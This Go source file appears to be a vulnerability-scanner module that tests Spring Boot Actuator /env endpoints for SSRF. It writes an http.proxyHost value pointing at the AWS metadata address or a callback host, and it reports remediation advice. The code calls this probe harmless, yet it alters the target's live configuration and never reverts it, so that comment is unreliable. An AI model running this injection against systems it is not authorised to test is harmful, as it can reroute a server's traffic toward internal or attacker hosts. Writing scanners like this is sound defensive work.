package web

// SSRF via Spring Actuator /env property injection
// Sets http.proxyHost/proxyPort or spring.datasource.url to an internal address
// to probe internal network resources

import (
	"context"
	"fmt"
	"strings"
	"time"

	httpclient "github.com/springhawk/springhawk/internal/http"
	"github.com/springhawk/springhawk/internal/vulns"
	"github.com/springhawk/springhawk/pkg/models"
	"github.com/springhawk/springhawk/pkg/utils"
)

func init() { vulns.RegisterRemote(&SSRFActuator{}) }

type SSRFActuator struct{}

func (m *SSRFActuator) ID() string               { return "ssrf-actuator-env" }
func (m *SSRFActuator) Name() string             { return "SSRF via Actuator /env Property Write" }
func (m *SSRFActuator) CVSS() float64            { return 8.6 }
func (m *SSRFActuator) Severity() models.Severity { return models.SeverityHigh }
func (m *SSRFActuator) Tags() []string { return []string{"ssrf", "actuator", "env", "spring-security"} }
func (m *SSRFActuator) Requirements() vulns.ModuleRequirements { return vulns.ModuleRequirements{} }
func (m *SSRFActuator) Description() string {
	return "Writable /actuator/env allows setting HTTP proxy or datasource URL to internal addresses, enabling SSRF to probe internal services."
}

func (m *SSRFActuator) Check(ctx context.Context, target *models.Target, client *httpclient.Client) ([]*models.Finding, error) {
	envPaths := []struct{ path string; v2 bool }{
		{"actuator/env", true},
		{"env", false},
	}

	for _, p := range envPaths {
		envURL := utils.JoinURL(target.BaseURL, p.path)
		getResp, err := client.Get(ctx, envURL, nil)
		if err != nil || getResp.StatusCode != 200 {
			continue
		}

		// Check if env is writable by sending a harmless probe property
		var body, ct string
		probeHost := "169.254.169.254" // AWS metadata SSRF target
		if target.CallbackHost != "" {
			probeHost = target.CallbackHost
		}

		if p.v2 {
			body = fmt.Sprintf(`{"name":"http.proxyHost","value":"%s"}`, probeHost)
			ct = "application/json"
		} else {
			body = fmt.Sprintf("http.proxyHost=%s", probeHost)
			ct = "application/x-www-form-urlencoded"
		}

		resp, err := client.Post(ctx, envURL, ct, strings.NewReader(body), nil)
		if err != nil || (resp.StatusCode != 200 && resp.StatusCode != 204) {
			continue
		}

		f := &models.Finding{
			ID:          fmt.Sprintf("%s-%d", m.ID(), time.Now().UnixNano()),
			Type:        models.FindingTypeVuln,
			Severity:    m.Severity(),
			CVSS:        m.CVSS(),
			Title:       "SSRF via Writable Actuator /env (http.proxyHost Injection)",
			Description: m.Description(),
			URL:         target.BaseURL,
			Endpoint:    "/" + p.path,
			Method:      "POST",
			Evidence:    fmt.Sprintf("/%s accepted http.proxyHost write (HTTP %d) → SSRF to internal services possible.", p.path, resp.StatusCode),
			Payload:     body,
			Remediation: "Restrict /actuator/env to read-only or disable entirely. Add authentication with admin role required.",
			Tags:        m.Tags(),
			Timestamp:   time.Now(),
			ModuleID:    m.ID(),
		}
		return []*models.Finding{f}, nil
	}
	return nil, nil
}

func (m *SSRFActuator) Exploit(ctx context.Context, target *models.Target, client *httpclient.Client) ([]*models.Finding, error) {
	return m.Check(ctx, target, client)
}
